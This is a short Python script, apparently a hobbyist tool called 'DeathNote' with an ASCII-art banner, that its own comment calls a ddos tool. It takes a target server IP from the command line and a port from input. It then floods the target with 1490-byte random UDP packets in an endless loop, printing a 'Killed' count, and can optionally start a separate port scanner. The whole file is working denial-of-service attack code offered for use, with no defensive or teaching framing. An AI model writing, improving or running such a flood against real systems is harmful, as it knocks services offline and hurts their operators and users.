import argparse 
import os
import socket
import random
#lib to install : argparse


#printing logo
print("""\

  ___           _   _    _  _     _       
 |   \ ___ __ _| |_| |_ | \| |___| |_ ___ 
 | |) / -_) _` |  _| ' \| .` / _ \  _/ -_)
 |___/\___\__,_|\__|_||_|_|\_\___/\__\___|
                                          
""")

print("--[made by PS]--")
print ("Use -h to see the options")

#ddos tool 
def death_note():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1490)
    ip = (args.server)
    port = int(input("[+]Port :"))
    s = 0
    while True :
        sock.sendto(bytes, (ip,port))
        s = s + 1
        print ("Killed :",s,"for", ip)
        
    


    

#starting input !``

parser = argparse.ArgumentParser()
parser.add_argument("--server", action="store", help="attack to server ip -s ip") 
parser.add_argument("--port_scanner", help="Add a port scanner to do a quick scan", action = "store_true")
args = parser.parse_args()
    
if args.server :
    print("[--target--]: " + args.server)
    
    death_note()
if args.port_scanner :
    os.system("python port_scanner.py ")



